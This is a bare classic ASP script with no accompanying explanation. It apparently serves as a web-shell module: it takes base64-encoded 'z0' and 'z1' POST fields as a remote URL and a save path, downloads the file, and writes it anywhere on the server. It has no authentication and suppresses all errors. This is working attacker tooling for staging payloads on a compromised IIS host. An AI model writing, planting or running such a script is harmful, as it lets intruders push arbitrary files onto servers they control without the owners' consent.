<%

On Error Resume Next

Function GetCurrentCharset()
    Dim charset
    charset = Response.CharSet
    If charset = "" Then
        Select Case Session.CodePage
            Case 65001 : charset = "utf-8"
            Case 1252  : charset = "windows-1252"
            Case 936   : charset = "gb2312"
            Case 950   : charset = "big5"
            Case 1251  : charset = "windows-1251"
            Case Else  : charset = "utf-8"
        End Select
    End If
    GetCurrentCharset = charset
End Function

Function Base64Decode(str)
    Dim xml, node, stream
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.createElement("b64")
    node.dataType = "bin.base64"
    node.text = str

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write node.nodeTypedValue
    stream.Position = 0
    stream.Type = 2
    stream.Charset = GetCurrentCharset()

    Base64Decode = stream.ReadText

    stream.Close
    Set stream = Nothing
    Set node = Nothing
    Set xml = Nothing
End Function

Function ParseFilename(headerStr)
    ParseFilename = ""
    Dim regEx, matches
    Set regEx = New RegExp
    regEx.Pattern = "filename=""?([^"";]+)""?"
    regEx.IgnoreCase = True
    
    If regEx.Test(headerStr) Then
        Set matches = regEx.Execute(headerStr)
        ParseFilename = matches(0).SubMatches(0)
    End If
    Set regEx = Nothing
End Function

Function FormatJson(success, errorMsg, filename, path)
    Dim json
    If success Then
        json = "{""success"":true,""filename"":""" & filename & """,""path"":""" & Replace(path, "\", "\\") & """}"
    Else
        json = "{""success"":false,""error"":""" & errorMsg & """}"
    End If
    FormatJson = json
End Function

Function Main()

    Dim url, save_dir
    url = Base64Decode(Request.Form("z0"))
    save_dir = Base64Decode(Request.Form("z1"))

    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    On Error Resume Next
    http.open "GET", url, False
    http.send

    if Err.Number <> 0 Then
        Main = FormatJson(False, "Download failed (Connection error)", "", "")
        Set http = Nothing
        Exit Function
    End If
    On Error GoTo 0

    If http.Status <> 200 Then
        Main = FormatJson(False, "Download failed (HTTP " & http.Status & ")", "", "")
        Set http = Nothing
        Exit Function
    End If

    Dim filename, cdHeader
    filename = ""
    
    On Error Resume Next
    cdHeader = http.getResponseHeader("Content-Disposition")
    On Error GoTo 0
    
    If cdHeader <> "" Then
        filename = ParseFilename(cdHeader)
    End If

    If filename = "" Then
        Dim urlPath
        urlPath = url
        If InStr(urlPath, "?") > 0 Then urlPath = Split(urlPath, "?")(0)
        If InStr(urlPath, "/") > 0 Then
            filename = Mid(urlPath, InStrRev(urlPath, "/") + 1)
        End If
    End If

    If filename = "" Or filename = "/" Then
        filename = "download.bin"
    End If

    Dim filePath
    filePath = save_dir
    If Right(filePath, 1) <> "/" And Right(filePath, 1) <> "\" Then
        filePath = filePath & "/"
    End If
    filePath = filePath & filename

    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    
    On Error Resume Next
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile filePath, 2
    stream.Close
    
    If Err.Number <> 0 Then
        Main = FormatJson(False, "Save file failed: " & Err.Description, "", "")
    Else
        Main = FormatJson(True, "", filename, filePath)
    End If
    On Error GoTo 0

    Set stream = Nothing
    Set http = Nothing

End Function

Response.ContentType = "application/json"
Response.Write Main()

%>